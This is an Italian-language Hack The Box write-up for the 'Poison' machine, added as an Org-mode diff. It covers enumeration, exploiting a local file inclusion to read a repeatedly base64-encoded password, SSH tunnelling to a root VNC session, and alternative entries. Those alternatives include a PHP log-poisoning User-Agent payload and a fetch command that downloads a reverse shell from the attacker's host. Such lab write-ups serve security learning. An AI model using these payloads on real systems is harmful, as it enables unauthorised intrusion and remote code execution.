@@ -1,0 +1,855 @@
+#+TITLE: HTB - Poison
+#+AUTHOR: Leonardo Tamiano
+#+HTML_HEAD_EXTRA: <style>pre { background-color: #000; color: #bbb; } </style>
+
+* Basic Info
+  :PROPERTIES:
+  :UNNUMBERED: t
+  :END:  
+  - *Default IP*: 10.10.10.84
+  - *Video*: [[https://www.youtube.com/watch?v=NyHuWFaK-y4&t=2136s][HTB - Poison]]
+  - *Table of contents*:
+    #+TOC: headlines 2
+
+  ------------------------
+  
+  A seguire è riportato un breve walkthrough della macchina *Poison*
+  offerta dalla piattaforma Hack the Box.
+
+* Enumeration
+** nmap
+*** nmap -sC -sV poison
+    #+begin_example
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-19 00:32 CET
+Nmap scan report for poison (10.129.69.246)
+Host is up (0.055s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
+|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
+|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
+|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.21 seconds     
+    #+end_example
+    
+*** nmap -p- poison
+   #+begin_example
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-19 00:32 CET                                          
+Stats: 0:03:53 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan                              
+Connect Scan Timing: About 68.83% done; ETC: 00:38 (0:01:46 remaining)                                   
+Stats: 0:03:55 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan                              
+Connect Scan Timing: About 69.27% done; ETC: 00:38 (0:01:44 remaining)                                   
+Nmap scan report for poison (10.129.69.246)         
+Host is up (0.055s latency).                        
+Not shown: 65533 closed ports                       
+PORT   STATE SERVICE                                
+22/tcp open  ssh                                    
+80/tcp open  http                                   
+
+Nmap done: 1 IP address (1 host up) scanned in 336.94 seconds     
+   #+end_example
+
+** dirb
+*** dirb http://10.10.10.84 -r -o tempo.dirb
+    #+begin_example
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+OUTPUT_FILE: tempo.dirb
+START_TIME: Sat May  5 10:06:22 2018
+URL_BASE: http://10.10.10.84/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt                                                   
+OPTION: Not Recursive
+
+-----------------
+
+GENERATED WORDS: 4612                                                                                  
+
+---- Scanning URL: http://10.10.10.84/ ----
++ http://10.10.10.84/index.php (CODE:200|SIZE:289)                                                     
++ http://10.10.10.84/info.php (CODE:200|SIZE:157)                                                      
++ http://10.10.10.84/phpinfo.php (CODE:200|SIZE:68229)                                                 
+
+-----------------
+END_TIME: Sat May  5 10:09:13 2018
+DOWNLOADED: 4612 - FOUND: 3
+    #+end_example
+
+** web server (port 80)
+*** ./browse.php?file=listfiles.php
+   #+begin_example
+Array
+(
+    [0] => .
+    [1] => ..
+    [2] => browse.php
+    [3] => index.php
+    [4] => info.php
+    [5] => ini.php
+    [6] => listfiles.php
+    [7] => phpinfo.php
+    [8] => pwdbackup.txt
+)
+      
+   #+end_example
+
+*** ./browse.php?file=pwdbackup.txt
+   #+begin_example
+This password is secure, it's encoded atleast 13 times.. what could go wrong really..
+
+Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU
+bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS
+bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW
+M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs
+WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy
+eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G
+WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw
+MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa
+T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k
+WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk
+WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0
+NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT
+Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz
+WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW
+VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO
+Ukd4RVdub3dPVU5uUFQwSwo=
+
+   #+end_example
+
+*** pwdbackup.txt
+    #+begin_example
+This password is secure, it's encoded atleast 13 times.. what
+could go wrong really..
+
+Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU
+bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS
+bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW
+M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs
+WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy
+eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G
+WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw
+MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa
+T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k
+WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk
+WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0
+NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT
+Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz
+WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW
+VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO
+Ukd4RVdub3dPVU5uUFQwSwo=
+    #+end_example
+
+*** Decoded password (after 13 passes)
+    Using the following script 
+
+    #+begin_src sh
+#!/usr/bin/sh
+
+END=13
+FILE="pwdbackup.txt."
+
+for i in $(seq 0 $END); do
+    (cat $FILE$i | base64 -d) > $FILE$((i+1))
+done         
+    #+end_src
+
+    on the previous file we get the following password
+    
+    #+begin_example
+Charix!2#4%6&8(0    
+    #+end_example
+   
+** priv esc
+*** charix
+**** ssh
+     Using password ~Charix!2#4%6&8(0~
+     #+begin_src sh
+ssh charix@poison
+     #+end_src
+
+**** secret.zip
+     The password was actually Charix!2#4%6&8(0 and the was the following
+
+     #+begin_example
+[leo@kali poison]$ file secret
+secret: Non-ISO extended-ASCII text, with no line terminators
+[leo@kali poison]$ cat secret
+[|Ֆz![leo@kali poison]$ hexdump -C secret
+00000000  bd a8 5b 7c d5 96 7a 21                           |..[|..z!|
+     #+end_example
+
+**** ps aux
+     Some process (not all)
+     #+begin_example
+root   319   0.0  0.5   9560  5052  -  Ss   20:20   0:00.05 /sbin/devd                                                                                                                                             
+root   390   0.0  0.2  10500  2396  -  Ss   20:20   0:00.03 /usr/sbin/syslogd -s                                                                                                                                   
+root   543   0.0  0.5  56320  5392  -  S    20:21   0:00.42 /usr/local/bin/vmtoolsd -c /usr/local/share/vmware-tools/tools.conf -p /usr/local/lib/open-vm-tools/plugins/vmsvc                                      
+root   620   0.0  0.7  57812  7052  -  Is   20:21   0:00.03 /usr/sbin/sshd                                                                                                                                         
+root   634   0.0  1.1  99172 11516  -  Ss   20:22   0:00.04 /usr/local/sbin/httpd -DNOHTTPACCEPT                                                                                                                   
+www    646   0.0  1.2 101220 12356  -  S    20:22   0:00.49 /usr/local/sbin/httpd -DNOHTTPACCEPT                                                                                                                   
+www    647   0.0  1.2 101220 12220  -  S    20:22   0:00.46 /usr/local/sbin/httpd -DNOHTTPACCEPT                                                                                                                   
+www    648   0.0  1.2 101220 12244  -  S    20:22   0:00.47 /usr/local/sbin/httpd -DNOHTTPACCEPT                                                                                                                   
+www    650   0.0  1.2 101220 12184  -  S    20:22   0:00.47 /usr/local/sbin/httpd -DNOHTTPACCEPT                                                                                                                   
+www    651   0.0  1.2 101220 12212  -  S    20:22   0:00.50 /usr/local/sbin/httpd -DNOHTTPACCEPT                                                                                                                   
+www    652   0.0  1.2 101220 12212  -  S    20:22   0:00.53 /usr/local/sbin/httpd -DNOHTTPACCEPT                                                                                                                   
+root   654   0.0  0.6  20636  6204  -  Ss   20:23   0:00.01 sendmail: accepting connections (sendmail)                                                                                                             
+smmsp  657   0.0  0.6  20636  5872  -  Is   20:23   0:00.00 sendmail: Queue runner@00:30:00 for /var/spool/clientmqueue (sendmail)                                                                                 
+root   661   0.0  0.2  12592  2436  -  Is   20:23   0:00.00 /usr/sbin/cron -s                                                                                                                                      
+root   718   0.0  0.8  85228  7836  -  Is   20:23   0:00.02 sshd: charix [priv] (sshd)                                                                                                                             
+www    720   0.0  1.2 101220 12216  -  S    20:23   0:00.43 /usr/local/sbin/httpd -DNOHTTPACCEPT                                                                                                                   
+charix 749   0.0  0.8  85228  7908  -  S    20:24   0:00.07 sshd: charix@pts/2 (sshd)                                                                                                                              
+root   754   0.0  0.8  85228  7836  -  Is   20:24   0:00.02 sshd: charix [priv] (sshd)                                                                                                                             
+charix 762   0.0  0.8  85228  7888  -  I    20:25   0:00.04 sshd: charix@pts/3 (sshd)                                                                                                                              
+www    798   0.0  1.2 101220 12216  -  S    20:26   0:00.34 /usr/local/sbin/httpd -DNOHTTPACCEPT
+www    839   0.0  1.2 101220 12220  -  S    20:27   0:00.27 /usr/local/sbin/httpd -DNOHTTPACCEPT
+www    843   0.0  1.2 101220 12196  -  S    20:27   0:00.26 /usr/local/sbin/httpd -DNOHTTPACCEPT
+www    846   0.0  1.2 101220 12192  -  S    20:27   0:00.29 /usr/local/sbin/httpd -DNOHTTPACCEPT
+www    847   0.0  1.2 101220 12216  -  S    20:27   0:00.24 /usr/local/sbin/httpd -DNOHTTPACCEPT
+root   529   0.0  0.9  23620  8868 v0- I    20:21   0:00.05 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/p
+root   540   0.0  0.7  67220  7064 v0- I    20:21   0:00.04 xterm -geometry 80x24+10+10 -ls -title X Desktop
+root   541   0.0  0.5  37620  5312 v0- I    20:21   0:00.02 twm
+root   708   0.0  0.2  10484  2076 v0  Is+  20:23   0:00.00 /usr/libexec/getty Pc ttyv0
+root   709   0.0  0.2  10484  2076 v1  Is+  20:23   0:00.00 /usr/libexec/getty Pc ttyv1
+root   710   0.0  0.2  10484  2076 v2  Is+  20:23   0:00.00 /usr/libexec/getty Pc ttyv2
+root   711   0.0  0.2  10484  2076 v3  Is+  20:23   0:00.00 /usr/libexec/getty Pc ttyv3
+root   712   0.0  0.2  10484  2076 v4  Is+  20:23   0:00.00 /usr/libexec/getty Pc ttyv4
+root   713   0.0  0.2  10484  2076 v5  Is+  20:23   0:00.00 /usr/libexec/getty Pc ttyv5
+root   714   0.0  0.2  10484  2076 v6  Is+  20:23   0:00.00 /usr/libexec/getty Pc ttyv6
+root   715   0.0  0.2  10484  2076 v7  Is+  20:23   0:00.00 /usr/libexec/getty Pc ttyv7
+root   566   0.0  0.4  19660  3616  0  Is+  20:21   0:00.02 -csh (csh)
+     #+end_example
+    
+**** sockstat
+     #+begin_example
+root     sshd       620   4  tcp4   *:22                  *:*
+root     twm        541   3  stream -> /tmp/.X11-unix/X1
+root     xterm      540   3  stream -> /tmp/.X11-unix/X1
+root     Xvnc       529   0  stream /tmp/.X11-unix/X1
+root     Xvnc       529   1  tcp4   127.0.0.1:5901        *:*
+root     Xvnc       529   3  tcp4   127.0.0.1:5801        *:*
+root     Xvnc       529   4  stream /tmp/.X11-unix/X1
+root     Xvnc       529   5  stream /tmp/.X11-unix/X1   
+     #+end_example
+
+     @@html: <hr style="border: 1px solid #A1283B;" />@@
+
+* Walkthrough
+** nmap scans
+   I soliti scan con namp ci revelano la seguente situazione
+
+   *nmap -sC -sV poison*
+   
+   #+begin_example
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-19 00:32 CET
+Nmap scan report for poison (10.129.69.246)
+Host is up (0.055s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
+|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
+|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
+|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.21 seconds     
+   #+end_example
+
+   Come possiamo vedere, abbiamo un server nella porta 80 e un server
+   ssh nella porta 22.
+
+** enumerazione web server
+   La prima cosa che notiamo andando nel sito web è che tramite lo
+   script ~browser.php~ abbiamo una *LFI* tramite il parametro ~file~.
+
+   Inoltre, chiamando lo script ~listfiles.php~ andando nel seguente URL
+
+   #+begin_example
+http://poison/browse.php?file=listfiles.php
+   #+end_example
+
+   otteniamo una una lista di file, che probabilmente è la lista dei
+   file presenti in una cartella del web server.
+
+   #+begin_example
+Array
+(
+    [0] => .
+    [1] => ..
+    [2] => browse.php
+    [3] => index.php
+    [4] => info.php
+    [5] => ini.php
+    [6] => listfiles.php
+    [7] => phpinfo.php
+    [8] => pwdbackup.txt
+)
+      
+   #+end_example
+
+   tra questi notiamo in particolare il file ~pwdbackup.txt~. Andandolo
+   a leggere tramite la solita LFI otteniamo 
+      
+   #+begin_example
+This password is secure, it's encoded atleast 13 times.. what could go wrong really..
+
+Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU
+bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS
+bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW
+M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs
+WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy
+eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G
+WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw
+MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa
+T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k
+WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk
+WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0
+NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT
+Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz
+WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW
+VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO
+Ukd4RVdub3dPVU5uUFQwSwo=
+
+   #+end_example
+
+** decodifica di pwdbackup.txt
+   Notiamo che il contenuto del file ~pwdbacup.txt~ è molto
+   probabilmente codificato in ~base64~. Per essere sicuri di questo
+   possiamo fare le seguenti considerazioni ([[https://stackoverflow.com/questions/8571501/how-to-check-whether-a-string-is-base64-encoded-or-not][link utile]]):
+
+   - La lunghezza della codifica è un multiplo di 4.
+       
+     #+begin_src sh
+# counts number of characters that are not newlines in a file
+expr $(cat test.txt | tr -d '\n' | wc -c) / 4  # --> 1164
+perl -e 'print 1164 / 4' # --> 291
+     #+end_src
+
+   - Ogni carattere della codifica appartiene all'insieme di caratteri
+     ~A-Z~, ~a-z~, ~0-9~, ~+~, ~/~, tranne che per il padding alla fine, che può
+     essere composto dai caratteri ~0~, ~1~ o ~=~.
+
+   Per decodificare il file iniziamo notando che possiamo
+   codificare/decodificare una data stringa in base64 utilizzando il
+   comando ononimo ~base64~.
+     
+   #+begin_src sh
+# encoding
+echo "hello world" | base64
+# -- aGVsbG8gd29ybGQK
+
+# decoding
+echo "aGVsbG8gd29ybGQK" | base64 -d
+# -- hello world
+   #+end_src
+
+   Per decodificare il contenuto del file 13 volte di fila possiamo
+   quindi utilizzare il seguente script bash. Per far funzionare
+   corretamente lo script dobbiamo prima salvare la codifica originale
+   in un file chiamato ~pwdbackup.txt.0~
+     
+   #+begin_src sh
+#!/usr/bin/sh
+
+END=13
+FILE="pwdbackup.txt."
+
+for i in $(seq 0 $END); do
+    (cat $FILE$i | base64 -d) > $FILE$((i+1))
+done         
+   #+end_src
+
+   Eseguendo lo script otteniamo quindi 14 file diversi
+
+   #+begin_example
+[leo@kali poison]$ ls
+decode.sh  pwdbackup.txt  pwdbackup.txt.0
+[leo@kali poison]$ ./decode.sh 
+[leo@kali poison]$ ls -lha
+totale 72K
+drwxr-xr-x 2 leo leo 4,0K 19 dic 01.10 .
+drwxr-xr-x 3 leo leo 4,0K 19 dic 00.32 ..
+-rwxr-xr-x 1 leo leo  127 19 dic 01.10 decode.sh
+-rw-r--r-- 1 leo leo 1,2K 19 dic 01.06 pwdbackup.txt
+-rw-r--r-- 1 leo leo 1,2K 19 dic 01.10 pwdbackup.txt.0
+-rw-r--r-- 1 leo leo  872 19 dic 01.10 pwdbackup.txt.1
+-rw-r--r-- 1 leo leo   53 19 dic 01.10 pwdbackup.txt.10
+-rw-r--r-- 1 leo leo   37 19 dic 01.10 pwdbackup.txt.11
+-rw-r--r-- 1 leo leo   25 19 dic 01.10 pwdbackup.txt.12
+-rw-r--r-- 1 leo leo   16 19 dic 01.10 pwdbackup.txt.13
+-rw-r--r-- 1 leo leo  645 19 dic 01.10 pwdbackup.txt.2
+-rw-r--r-- 1 leo leo  475 19 dic 01.10 pwdbackup.txt.3
+-rw-r--r-- 1 leo leo  349 19 dic 01.10 pwdbackup.txt.4
+-rw-r--r-- 1 leo leo  256 19 dic 01.10 pwdbackup.txt.5
+-rw-r--r-- 1 leo leo  187 19 dic 01.10 pwdbackup.txt.6
+-rw-r--r-- 1 leo leo  138 19 dic 01.10 pwdbackup.txt.7
+-rw-r--r-- 1 leo leo  102 19 dic 01.10 pwdbackup.txt.8
+-rw-r--r-- 1 leo leo   73 19 dic 01.10 pwdbackup.txt.9
+   #+end_example
+
+   Il file di nostro interesse in particolare è il file chiamato
+   ~pwdbackup.txt.13~, in quanto contiene il valore ottenuto iterando 13
+   volte di fila la decodifica base64.
+     
+   #+begin_src sh
+[leo@kali poison]$ cat pwdbackup.txt.13
+Charix!2#4%6&8(0
+   #+end_src
+
+** user flag
+   Per entrare effettivamente nel server inizialmente possiamo
+   utilizzare ssh e la password appena trovata. Notiamo infatti che le
+   credenziali di accesso sono le seguenti
+
+   #+begin_example
+charix:Charix!2#4%6&8(0     
+   #+end_example
+
+   Mentre la password è stata ottenuta nello step precedente,
+   l'username lo si è dovuto indovinare dalla password.
+
+   -------------------
+
+   Una volta entrati possiamo subito leggere la flag ~user.txt~ nella
+   home directory dell'utente ~charix~
+     
+   #+begin_example
+charix@Poison:~ % ls
+secret.zip      user.txt
+   #+end_example
+
+** unzippare secret.zip
+   Dopo aver preso la user flag notiamo che nella home directory
+   dell'utente ~charix~ c'è un file particolare, chiamato ~secret.zip~
+
+   #+begin_example
+-rw-r-----  1 root    charix   166B Mar 19  2018 secret.zip
+   #+end_example
+
+   Per unzipparlo ci viene richiesta una password. La password
+   scoperta prima (quella dell'utente charix che ci ha permesso di
+   entrare nella macchina) sembra funzionare.
+
+   #+begin_example
+[leo@kali poison]$ unzip secret.zip 
+Archive:  secret.zip
+[secret.zip] secret password: 
+ extracting: secret     
+   #+end_example
+
+   Una volta unzippato otteniamo un file chiamato ~secret~, che a quanto
+   pare contiene del contenuto in binario.
+   
+   #+begin_example
+[leo@kali poison]$ file secret
+secret: Non-ISO extended-ASCII text, with no line terminators
+[leo@kali poison]$ cat secret
+[|Ֆz![leo@kali poison]$ hexdump -C secret
+00000000  bd a8 5b 7c d5 96 7a 21                           |..[|..z!|
+   #+end_example
+   
+** ssh tunneling
+   Continuando, possiamo eseguire il comando ~ps aux~ per notare, tra i
+   vari processi, anche il seguente, che ci permette di capire che il
+   programma ~Xvnc~ sta girando come l'utente ~root~.
+
+   #+begin_example
+root    614   0.0  0.9  23620  8868 v0- I    00:33    0:00.02 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc
+   #+end_example
+
+   Utilizzando poi il programma ~sockstat~ vediamo che il programma ~Xvnc~
+   sta ascoltando nelle seguenti porte
+     
+   #+begin_example
+charix@Poison:~ % sockstat
+// ----
+root     Xvnc       614   0  stream /tmp/.X11-unix/X1
+root     Xvnc       614   1  tcp4   127.0.0.1:5901        *:*
+root     Xvnc       614   3  tcp4   127.0.0.1:5801        *:*
+root     Xvnc       614   4  stream /tmp/.X11-unix/X1
+root     Xvnc       614   5  stream /tmp/.X11-unix/X1     
+// ----
+   #+end_example
+
+   Dato che ~Xvnc~ sta ascoltando in una porta locale, per connetterci a
+   tale programma dobbiamo utilizzare l'abilità di ssh di creare dei
+   tunnel. Possiamo creare un tunnel che connette la porta locale
+   $1337$ della nostra macchina con la porta locale $5801$ della
+   macchina remota nel seguente modo
+   
+   #+begin_example
+[leo@kali poison]$ ssh charix@poison -L 1337:localhost:5801     
+   #+end_example
+
+   Una volta che abbiamo creato il tunnel possiamo utilizzare il
+   programma ~vncviewer~ nella nostra macchina per connetterci
+   all'istanza remota di ~Xvnc~
+   
+   #+begin_example
+[leo@kali poison]$ vncviewer -passwd secret localhost:5902   
+   #+end_example
+
+   Dove notiamo che il file ~secret~ è il file ottenuto precedentemente
+   unzippando l'archivio ~secret.zip~ trovato nella macchina remota.
+
+** root flag
+   Dopo aver lanciato il comando ~vncivewer~ abbiamo ottenuto una shell
+   grafica da root nella macchina remota. A questo punto possiamo
+   tranquillamente leggere la root flag nella path
+
+   #+begin_example
+/root/root.txt
+   #+end_example
+   
+* Extra
+  Andiamo adesso a vedere due metodi alternativi per entrare nella
+  macchina.
+  
+** phpinfo() + LFI = RCE
+   # No longer works
+   # https://github.com/M4LV0/LFI-phpinfo-RCE/blob/master/exploit.py
+
+   Il primo metodo è un metodo abbastanza generale per attaccare le
+   applicazioni scritte in php che funziona quando le seguenti ipotesi
+   sono soddisfatte:
+
+   - abbiamo una scoperto una LFI.
+
+   - siamo in grado di leggere la pagina ~phpinfo()~
+   
+   L'idea è quella di exploitare una race condition che ci permette di
+   eseguire del codice arbitrario php nel seguente modo:
+
+   1. Inviamo una richiesta con un payload scritto in php nella pagina
+      ~phpinfo()~.
+
+   2. Dalla pgina ~phpinfo()~ leggiamo il nome del file in cui l'engine
+      php ha salvato il payload inviato precedentemente.
+      
+   3. Utilizzando la LFI andiamo ad accedere alla path letta nel passo
+      precedente.
+
+   Dato però che l'engine php rimuove tutti i file temporanei una
+   volta che ha finito di processare la richiesta, per cercare di
+   leggere il codice php prima che questo venga eliminato possiamo
+   aggiungere del padding in vari campi dell'header.
+
+   Per maggiori informazioni rimando al seguente link: [[https://dl.packetstormsecurity.net/papers/general/LFI_With_PHPInfo_Assitance.pdf][LFI with phpinfo() assistance]].
+   
+** Log Poisoning
+   Un altro modo per entrare nella macchina consiste nel fare *log
+   poisoning* nei log situati nel file
+
+   #+begin_example
+/var/log/httpd-access.log
+   #+end_example
+
+   Per fare questo possiamo inviare la seguente richiesta HTTP
+
+   #+begin_example
+GET /browse.php?file=/var/log/httpd-access.log HTTP/1.1
+Host: poison
+Upgrade-Insecure-Requests: 1
+User-Agent: <?php system($_REQUEST['cmd']); ?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close     
+   #+end_example
+
+   Andando ad accedere al log utilizzando la LFI possiamo quindi
+   eseguire i nostri comando
+     
+   #+begin_example
+http://poison/browse.php?file=/var/log/httpd-access.log&cmd=whoami
+   #+end_example
+
+   Infine, per ottenere la shell possiamo utilizzare il comando ~fetch~
+   nella macchina remota per trasportare nella vittima una revshell
+   scritta in php.
+     
+   #+begin_example
+# command
+fetch -o /tmp/shell.php http://<our_ip>:<our_port>/revshell.php
+# url encoded
+fetch%20-o%20%2Ftmp%2Fshell.php%20http%3A%2F%2F10.10.14.54%3A8000%2Frevshell.php%20     
+   #+end_example
+
+   Una volta fatto questo possiamo semplicemente utilizzare la LFI per
+   spawnare la nostra rev shell.
+     
+   #+begin_example
+http://poison/browse.php?file=/tmp/shell.php     
+   #+end_example
+
+* Legacy Walkthrough                                               :noexport:
+** nmap scans
+   
+   ~nmap -sV -sC -oA nmap 10.10.10.84~
+    #+begin_example
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-05 19:02 CEST
+Nmap scan report for 10.10.10.84
+Host is up (0.034s latency).
+Not shown: 993 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
+|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
+|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
+80/tcp   open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
+|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+5802/tcp open  http    Bacula http config
